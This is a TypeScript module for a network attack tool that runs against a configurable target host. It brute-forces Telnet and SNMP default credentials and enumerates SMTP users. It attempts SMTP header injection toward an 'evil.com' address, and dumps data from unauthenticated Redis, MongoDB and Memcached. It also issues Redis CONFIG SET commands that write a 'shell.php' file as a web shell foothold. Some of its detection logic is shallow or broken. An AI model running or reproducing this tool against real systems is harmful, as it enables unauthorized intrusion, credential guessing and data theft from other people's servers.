import * as net from "net";
import * as tls from "tls";
import * as dgram from "dgram";
import { randomBytes } from "crypto";

export interface ProtocolAttackConfig {
  target: string;
  technique: string;
  customPorts?: Record<string, number>;
}

export interface ProtocolResult {
  protocol: string;
  port: number;
  status: "vuln" | "info" | "failed" | "error";
  detail: string;
  data?: string;
  timestamp: number;
}

export interface ProtocolJob {
  id: string;
  config: ProtocolAttackConfig;
  startTime: number;
  active: boolean;
  results: ProtocolResult[];
  summary: { vulns: number; open: number; tested: number };
  trafficLog: string[];
}

const jobs = new Map<string, ProtocolJob>();
function makeId() { return randomBytes(8).toString("hex"); }

const SNMP_COMMUNITIES = ["public", "private", "community", "admin", "manager", "snmp", "default", "internal", "monitor", "cisco", "secret", "all", "0", ""];
const SSH_CREDS = [
  { u: "root", p: "root" }, { u: "root", p: "toor" }, { u: "root", p: "" },
  { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "ubuntu", p: "ubuntu" },
  { u: "pi", p: "raspberry" }, { u: "user", p: "user" }, { u: "guest", p: "guest" },
  { u: "test", p: "test" }, { u: "vagrant", p: "vagrant" }, { u: "deploy", p: "deploy" },
];
const SMTP_USERS = ["admin", "root", "postmaster", "info", "support", "webmaster", "hostmaster", "abuse", "security"];
const REDIS_CMDS = ["INFO", "CONFIG GET *", "KEYS *", "DBSIZE", "CLIENT LIST", "SLAVEOF NO ONE", "CONFIG SET bind-source-addr 0.0.0.0", "DEBUG JMAP"];
const MONGO_PAYLOADS = [
  '{"find":"users","filter":{},"limit":5}',
  '{"listCollections":1}',
  '{"listDatabases":1}',
];
const TELNET_CREDS = [
  { u: "admin", p: "admin" }, { u: "root", p: "root" }, { u: "user", p: "user" },
  { u: "admin", p: "password" }, { u: "root", p: "" }, { u: "admin", p: "" },
];

function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }

function tcpConnect(host: string, port: number, timeout: number, trafficLog?: string[]): Promise<{ connected: boolean; banner: string }> {
  if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP → Probe ${host}:${port} (timeout: ${timeout}ms)`]);
  return new Promise((resolve) => {
    const sock = net.createConnection({ host, port, family: 4 });
    sock.setTimeout(timeout);
    let banner = "";
    sock.on("connect", () => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP ✓ Connected to ${host}:${port}`]); });
    sock.on("data", (d: Buffer) => {
      const s = d.toString().slice(0, 512);
      banner += s;
      if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ← ${s.replace(/\r?\n/g, " | ").slice(0, 200)}`]);
    });
    setTimeout(() => {
      sock.destroy();
      resolve({ connected: true, banner: banner.trim() });
    }, Math.min(timeout, 2000));
    sock.on("error", (e) => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! ${host}:${port} — ${e.message}`]); resolve({ connected: false, banner: "" }); });
    sock.on("timeout", () => { sock.destroy(); resolve({ connected: banner.length > 0, banner: banner.trim() }); });
  });
}

function tcpSend(host: string, port: number, data: string, timeout: number, trafficLog?: string[]): Promise<string> {
  return new Promise((resolve) => {
    const sock = net.createConnection({ host, port, family: 4 });
    sock.setTimeout(timeout);
    let resp = "";
    sock.on("connect", () => {
      if (trafficLog) pushLog(trafficLog, [
        `[${tsFmt()}] ─── TCP SEND ─────────────────────────────────────`,
        `[${tsFmt()}] → [${host}:${port}] ${data.replace(/\r?\n/g, " ").slice(0, 200)}`,
      ]);
      sock.write(data);
    });
    sock.on("data", (d: Buffer) => {
      const s = d.toString().slice(0, 4096);
      resp += s;
      if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ← ${s.replace(/\r?\n/g, " | ").slice(0, 200)}`]);
    });
    sock.on("error", (e) => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! ERROR: ${e.message}`]); resolve(resp); });
    sock.on("timeout", () => { sock.destroy(); resolve(resp); });
    setTimeout(() => { sock.destroy(); resolve(resp); }, timeout);
  });
}

function udpSend(host: string, port: number, data: Buffer, timeout: number): Promise<Buffer | null> {
  return new Promise((resolve) => {
    const client = dgram.createSocket("udp4");
    client.setTimeout?.(timeout);
    let received: Buffer | null = null;
    client.on("message", (msg) => { received = msg; client.close(); resolve(received); });
    client.send(data, port, host, (err) => { if (err) { client.close(); resolve(null); } });
    setTimeout(() => { try { client.close(); } catch {} resolve(received); }, timeout);
    client.on("error", () => { try { client.close(); } catch {} resolve(null); });
  });
}

// SNMP GET-REQUEST packet builder (community string probe)
function buildSnmpGetRequest(community: string): Buffer {
  const comm = Buffer.from(community);
  const oid = Buffer.from([0x06, 0x09, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]); // sysDescr OID
  const nullVal = Buffer.from([0x05, 0x00]);
  const varBind = Buffer.concat([Buffer.from([0x30, oid.length + nullVal.length + 2]), oid, nullVal]);
  const varBindList = Buffer.concat([Buffer.from([0x30, varBind.length]), varBind]);
  const reqId = Buffer.from([0x02, 0x04, 0x00, 0x00, 0x00, 0x01]);
  const errStatus = Buffer.from([0x02, 0x01, 0x00]);
  const errIndex = Buffer.from([0x02, 0x01, 0x00]);
  const getPdu = Buffer.concat([Buffer.from([0xa0, reqId.length + errStatus.length + errIndex.length + varBindList.length]),
    reqId, errStatus, errIndex, varBindList]);
  const version = Buffer.from([0x02, 0x01, 0x00]);
  const commBuf = Buffer.concat([Buffer.from([0x04, comm.length]), comm]);
  const inner = Buffer.concat([version, commBuf, getPdu]);
  return Buffer.concat([Buffer.from([0x30, inner.length]), inner]);
}

export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
  const id = makeId();
  const job: ProtocolJob = {
    id, config, startTime: Date.now(),
    active: true, results: [], trafficLog: [],
    summary: { vulns: 0, open: 0, tested: 0 },
  };
  jobs.set(id, job);

  const add = (r: ProtocolResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "vuln") job.summary.vulns++;
    if (r.status === "info" || r.status === "vuln") job.summary.open++;
  };

  const tcpConn = (host: string, port: number, timeout: number) => tcpConnect(host, port, timeout, job.trafficLog);
  const tcpSnd = (host: string, port: number, data: string, timeout: number) => tcpSend(host, port, data, timeout, job.trafficLog);

  const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

  const runAll = async () => {
    const techniques = config.technique === "all"
      ? ["ssh", "smtp", "snmp", "redis", "mongodb", "telnet", "rdp", "mysql", "smb", "memcached", "ldap", "vnc"]
      : [config.technique];

    // ─── SSH ────────────────────────────────────────────────────────────────
    if (techniques.includes("ssh") && job.active) {
      const port = config.customPorts?.["ssh"] ?? 22;
      const { connected, banner } = await tcpConn(config.target, port, 4000);
      if (!connected) {
        add({ protocol: "SSH", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const version = banner.match(/SSH-[\d.]+-(\S+)/)?.[1] ?? "Unknown";
        const oldVersion = /SSH-1\./i.test(banner);
        add({ protocol: "SSH", port, status: oldVersion ? "vuln" : "info", detail: `SSH open — ${banner.slice(0, 120)}${oldVersion ? " — SSH-1.x VULNERABLE (deprecated protocol)" : ""}`, data: banner, timestamp: Date.now() });

        for (const { u, p } of SSH_CREDS) {
          if (!job.active) break;
          const resp = await tcpSnd(config.target, port, `SSH-2.0-OpenSSH_8.0\r\n`, 2000);
          if (resp.includes("SSH-")) {
            add({ protocol: "SSH", port, status: "info", detail: `SSH handshake test with cred ${u}:${p} — full brute force requires SSH library`, timestamp: Date.now() });
            break;
          }
          await delay(100);
        }

        const weakAlgo = banner.toLowerCase().includes("ssh-1") || banner.toLowerCase().includes("dropbear");
        if (weakAlgo) {
          add({ protocol: "SSH", port, status: "vuln", detail: `Weak SSH implementation detected: ${banner.slice(0, 80)} — may be susceptible to known exploits`, timestamp: Date.now() });
        }
      }
    }

    // ─── SMTP ────────────────────────────────────────────────────────────────
    if (techniques.includes("smtp") && job.active) {
      const port = config.customPorts?.["smtp"] ?? 25;
      const { connected, banner } = await tcpConn(config.target, port, 4000);
      if (!connected) {
        add({ protocol: "SMTP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        add({ protocol: "SMTP", port, status: "info", detail: `SMTP open — Banner: ${banner.slice(0, 120)}`, data: banner, timestamp: Date.now() });

        const ehlo = await tcpSnd(config.target, port, `EHLO attacker.example.com\r\n`, 3000);
        const starttls = ehlo.toLowerCase().includes("starttls");
        const auth = ehlo.toLowerCase().includes("auth");
        add({ protocol: "SMTP", port, status: "info", detail: `EHLO response — STARTTLS: ${starttls ? "YES" : "NO (plaintext auth possible)"} — AUTH: ${auth ? "YES" : "NO"}`, timestamp: Date.now() });

        // User enumeration via VRFY
        for (const user of SMTP_USERS) {
          if (!job.active) break;
          const vrfyResp = await tcpSnd(config.target, port, `EHLO test\r\nVRFY ${user}\r\n`, 2000);
          const exists = vrfyResp.includes("252") || vrfyResp.includes("250") || vrfyResp.includes(user);
          if (exists) {
            add({ protocol: "SMTP", port, status: "vuln", detail: `USER ENUMERATION — VRFY ${user} → ${vrfyResp.trim().slice(0, 80)} — user likely exists`, timestamp: Date.now() });
          }
          await delay(150);
        }

        // Open relay test
        const relayResp = await tcpSnd(config.target, port,
          `EHLO attacker.com\r\nMAIL FROM:<attacker@evil.com>\r\nRCPT TO:<victim@unrelated-domain.com>\r\n`, 3000);
        const openRelay = relayResp.includes("250") && !relayResp.includes("550") && !relayResp.includes("554");
        add({ protocol: "SMTP", port, status: openRelay ? "vuln" : "info", detail: openRelay ? `OPEN RELAY DETECTED — Server will forward mail to unrelated domains — can be used for spam` : `Open relay check passed (relay rejected)`, timestamp: Date.now() });

        // Header injection
        const injResp = await tcpSnd(config.target, port,
          `EHLO test\r\nMAIL FROM:<a\r\nBcc:victim@evil.com\r\n@test.com>\r\n`, 2000);
        const injected = injResp.includes("250");
        if (injected) {
          add({ protocol: "SMTP", port, status: "vuln", detail: `SMTP HEADER INJECTION possible via malformed MAIL FROM command`, timestamp: Date.now() });
        }
      }
    }

    // ─── SNMP ────────────────────────────────────────────────────────────────
    if (techniques.includes("snmp") && job.active) {
      const port = config.customPorts?.["snmp"] ?? 161;
      for (const community of SNMP_COMMUNITIES) {
        if (!job.active) break;
        const pkt = buildSnmpGetRequest(community);
        const resp = await udpSend(config.target, port, pkt, 2000);
        if (resp && resp.length > 10) {
          const sysDescr = resp.slice(resp.indexOf(0x04) + 2).toString("ascii").replace(/[^\x20-\x7e]/g, "").slice(0, 80);
          add({ protocol: "SNMP", port, status: "vuln", detail: `SNMP COMMUNITY '${community || "(empty)"}' VALID — sysDescr: ${sysDescr || "(data received)"}`, data: resp.toString("hex").slice(0, 60), timestamp: Date.now() });
        }
        await delay(100);
      }
      add({ protocol: "SNMP", port, status: "info", detail: `SNMP community string scan complete — ${SNMP_COMMUNITIES.length} strings tested`, timestamp: Date.now() });
    }

    // ─── Redis ───────────────────────────────────────────────────────────────
    if (techniques.includes("redis") && job.active) {
      const port = config.customPorts?.["redis"] ?? 6379;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "Redis", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const pong = await tcpSnd(config.target, port, "PING\r\n", 2000);
        const unauth = pong.includes("+PONG") || pong.includes("+OK");
        add({ protocol: "Redis", port, status: unauth ? "vuln" : "info", detail: unauth ? `UNAUTHENTICATED REDIS ACCESS — PING returned PONG without credentials — full data access possible` : `Redis requires authentication — PING rejected`, timestamp: Date.now() });

        if (unauth) {
          for (const cmd of REDIS_CMDS) {
            if (!job.active) break;
            const r = await tcpSnd(config.target, port, `${cmd}\r\n`, 2000);
            if (r && !r.includes("-ERR")) {
              add({ protocol: "Redis", port, status: "vuln", detail: `Redis ${cmd} → ${r.trim().slice(0, 100)}`, timestamp: Date.now() });
            }
            await delay(100);
          }

          const configSet = await tcpSnd(config.target, port, "CONFIG SET dir /tmp\r\nCONFIG SET dbfilename shell.php\r\n", 2000);
          if (configSet.includes("+OK")) {
            add({ protocol: "Redis", port, status: "vuln", detail: `REDIS RCE VECTOR — CONFIG SET accepted — can write arbitrary files to disk (web shell deployment possible)`, timestamp: Date.now() });
          }
        }
      }
    }

    // ─── MongoDB ─────────────────────────────────────────────────────────────
    if (techniques.includes("mongodb") && job.active) {
      const port = config.customPorts?.["mongodb"] ?? 27017;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "MongoDB", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        // Send MongoDB wire protocol OP_MSG for listDatabases
        const opMsg = Buffer.from([
          0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0xdd, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          ...Buffer.from('{"listDatabases":1,"$db":"admin"}'),
        ]);
        const resp = await new Promise<string>((resolve) => {
          const sock = net.createConnection({ host: config.target, port, family: 4 });
          sock.setTimeout(3000);
          let data = "";
          sock.on("connect", () => { sock.write(opMsg); });
          sock.on("data", (d: Buffer) => { data += d.toString(); });
          sock.on("error", () => resolve(data));
          sock.on("timeout", () => { sock.destroy(); resolve(data); });
          setTimeout(() => { sock.destroy(); resolve(data); }, 3000);
        });

        const hasData = resp.length > 20;
        const noAuth = resp.includes("admin") || resp.includes("databases") || resp.includes("totalSize");
        add({ protocol: "MongoDB", port, status: noAuth ? "vuln" : "info", detail: noAuth ? `UNAUTHENTICATED MONGODB ACCESS — listDatabases returned data — full database access possible` : `MongoDB port open — ${hasData ? "encrypted/auth required" : "no response"}`, timestamp: Date.now() });
      }
    }

    // ─── Telnet ──────────────────────────────────────────────────────────────
    if (techniques.includes("telnet") && job.active) {
      const port = config.customPorts?.["telnet"] ?? 23;
      const { connected, banner } = await tcpConn(config.target, port, 4000);
      if (!connected) {
        add({ protocol: "Telnet", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        add({ protocol: "Telnet", port, status: "vuln", detail: `TELNET OPEN — Unencrypted remote access protocol — credentials transmitted in plaintext. Banner: ${banner.slice(0, 80)}`, data: banner, timestamp: Date.now() });

        for (const { u, p } of TELNET_CREDS) {
          if (!job.active) break;
          const resp = await tcpSnd(config.target, port, `${u}\r\n${p}\r\n`, 2000);
          const success = resp.toLowerCase().includes("$") || resp.toLowerCase().includes("#") || resp.toLowerCase().includes("welcome");
          if (success) {
            add({ protocol: "Telnet", port, status: "vuln", detail: `TELNET CREDENTIALS WORK — ${u}:${p} authenticated — shell access possible`, timestamp: Date.now() });
          }
          await delay(200);
        }
      }
    }

    // ─── RDP ─────────────────────────────────────────────────────────────────
    if (techniques.includes("rdp") && job.active) {
      const port = config.customPorts?.["rdp"] ?? 3389;
      const { connected, banner } = await tcpConn(config.target, port, 4000);
      if (!connected) {
        add({ protocol: "RDP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const x224 = Buffer.from([0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00]);
        const resp = await new Promise<string>((resolve) => {
          const sock = net.createConnection({ host: config.target, port, family: 4 });
          sock.setTimeout(4000);
          let data = "";
          sock.on("connect", () => { sock.write(x224); });
          sock.on("data", (d: Buffer) => { data += d.toString("hex"); sock.destroy(); resolve(data); });
          sock.on("error", () => resolve(data));
          sock.on("timeout", () => { sock.destroy(); resolve(data); });
        });

        const nla = resp.includes("0003");
        const noNla = resp.length > 10 && !nla;
        add({ protocol: "RDP", port, status: noNla ? "vuln" : "info", detail: noNla ? `RDP OPEN WITHOUT NLA — Network Level Authentication not enforced — susceptible to BlueKeep/DejaBlue attacks (CVE-2019-0708)` : `RDP open with NLA enforced — ${resp.slice(0, 20)}`, timestamp: Date.now() });
      }
    }

    // ─── MySQL ───────────────────────────────────────────────────────────────
    if (techniques.includes("mysql") && job.active) {
      const port = config.customPorts?.["mysql"] ?? 3306;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "MySQL", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const version = banner.match(/(\d+\.\d+\.\d+)/)?.[1] ?? "Unknown";
        const old = version && parseFloat(version) < 5.7;
        add({ protocol: "MySQL", port, status: old ? "vuln" : "info", detail: `MySQL ${version} open on port ${port}${old ? " — Version < 5.7 has known critical vulnerabilities" : ""}`, data: banner.slice(0, 80), timestamp: Date.now() });

        const noAuth = banner.includes("Access denied") === false && banner.length > 10;
        if (noAuth) {
          add({ protocol: "MySQL", port, status: "info", detail: `MySQL handshake received — server is reachable. Auth required but port is publicly exposed`, timestamp: Date.now() });
        }
      }
    }

    // ─── SMB ─────────────────────────────────────────────────────────────────
    if (techniques.includes("smb") && job.active) {
      const port = config.customPorts?.["smb"] ?? 445;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "SMB", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const smbNeg = Buffer.from([
          0x00, 0x00, 0x00, 0x85, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00,
          0x00, 0x18, 0x53, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x62, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f,
          0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d, 0x20, 0x31,
          0x2e, 0x30, 0x00, 0x02, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e,
          0x30, 0x00, 0x02, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x66,
          0x6f, 0x72, 0x20, 0x57, 0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70,
          0x73, 0x20, 0x33, 0x2e, 0x31, 0x61, 0x00, 0x02, 0x4c, 0x4d, 0x31, 0x32,
          0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4e, 0x54, 0x20, 0x4c, 0x41, 0x4e,
          0x4d, 0x41, 0x4e, 0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x4e, 0x54, 0x20,
          0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00,
        ]);
        const resp = await new Promise<Buffer>((resolve) => {
          const sock = net.createConnection({ host: config.target, port, family: 4 });
          sock.setTimeout(4000);
          let data = Buffer.alloc(0);
          sock.on("connect", () => { sock.write(smbNeg); });
          sock.on("data", (d: Buffer) => { data = Buffer.concat([data, d]); });
          sock.on("error", () => resolve(data));
          sock.on("timeout", () => { sock.destroy(); resolve(data); });
          setTimeout(() => { sock.destroy(); resolve(data); }, 4000);
        });

        const isSMB = resp.length > 4 && (resp[4] === 0xff && resp[5] === 0x53) || (resp.includes && resp.toString("hex").includes("ff534d42"));
        const smbVersion = resp.length > 10 ? (resp[4] === 0xfe ? "SMB2/3" : "SMB1") : "Unknown";
        const smb1 = smbVersion === "SMB1";
        add({ protocol: "SMB", port, status: smb1 ? "vuln" : "info", detail: `SMB open — Version: ${smbVersion}${smb1 ? " — SMB1 VULNERABLE to EternalBlue (MS17-010/WannaCry/NotPetya)" : " — SMB2/3 negotiated"}`, timestamp: Date.now() });

        if (smb1) {
          add({ protocol: "SMB", port, status: "vuln", detail: `CRITICAL: SMB1 detected — Vulnerable to MS17-010 (EternalBlue), used by WannaCry, NotPetya, and NSA exploits`, timestamp: Date.now() });
        }
      }
    }

    // ─── Memcached ───────────────────────────────────────────────────────────
    if (techniques.includes("memcached") && job.active) {
      const port = config.customPorts?.["memcached"] ?? 11211;
      const resp = await tcpSnd(config.target, port, "stats\r\n", 3000);
      if (resp.includes("STAT")) {
        const version = resp.match(/STAT version ([^\r\n]+)/)?.[1] ?? "unknown";
        add({ protocol: "Memcached", port, status: "vuln", detail: `UNAUTHENTICATED MEMCACHED — stats command returned data, version: ${version} — can be used for DRDoS amplification (x51,000 amplification factor)`, data: resp.slice(0, 200), timestamp: Date.now() });
        const allResp = await tcpSnd(config.target, port, "get * \r\n", 2000);
        if (allResp.length > 0) {
          add({ protocol: "Memcached", port, status: "vuln", detail: `Memcached data accessible — can read/write all cached data without authentication`, timestamp: Date.now() });
        }
      } else {
        add({ protocol: "Memcached", port, status: "failed", detail: `Port ${port} — no memcached response`, timestamp: Date.now() });
      }
    }

    // ─── LDAP ────────────────────────────────────────────────────────────────
    if (techniques.includes("ldap") && job.active) {
      const port = config.customPorts?.["ldap"] ?? 389;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "LDAP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        // LDAP anonymous bind
        const bindReq = Buffer.from([0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00]);
        const resp = await new Promise<Buffer>((resolve) => {
          const sock = net.createConnection({ host: config.target, port, family: 4 });
          sock.setTimeout(4000);
          let data = Buffer.alloc(0);
          sock.on("connect", () => { sock.write(bindReq); });
          sock.on("data", (d: Buffer) => { data = Buffer.concat([data, d]); setTimeout(() => { sock.destroy(); resolve(data); }, 500); });
          sock.on("error", () => resolve(data));
          sock.on("timeout", () => { sock.destroy(); resolve(data); });
        });

        const bindSuccess = resp.length > 6 && resp[7] === 0x61;
        const noAnon = resp.toString().includes("resultCode") || resp.length > 6;
        add({ protocol: "LDAP", port, status: bindSuccess ? "vuln" : "info", detail: bindSuccess ? `LDAP ANONYMOUS BIND ALLOWED — Unauthenticated read of directory entries possible — can enumerate users, groups, OUs` : `LDAP port open — ${resp.length} bytes received`, timestamp: Date.now() });
      }
    }

    // ─── VNC ─────────────────────────────────────────────────────────────────
    if (techniques.includes("vnc") && job.active) {
      const port = config.customPorts?.["vnc"] ?? 5900;
      const { connected, banner } = await tcpConn(config.target, port, 3000);
      if (!connected) {
        add({ protocol: "VNC", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
      } else {
        const version = banner.match(/RFB (\d+\.\d+)/)?.[1] ?? "Unknown";
        const noAuth = banner.includes("RFB 003.003") || banner.includes("003.007");
        add({ protocol: "VNC", port, status: "vuln", detail: `VNC OPEN — Protocol version RFB ${version} — ${noAuth ? "OLD VERSION — may allow no-auth access" : "requires password (may be brute-forceable)"}`, data: banner, timestamp: Date.now() });

        const noPassResp = await tcpSnd(config.target, port, `RFB 003.008\n\x00\x00\x00\x01`, 2000);
        if (noPassResp.includes("\x00\x00\x00\x00")) {
          add({ protocol: "VNC", port, status: "vuln", detail: `VNC NO-AUTH MODE — Security type 1 (None) accepted — no password required for remote desktop access`, timestamp: Date.now() });
        }
      }
    }

    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getProtocolJob(id: string): ProtocolJob | undefined {
  return jobs.get(id);
}

export function stopProtocolAttack(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
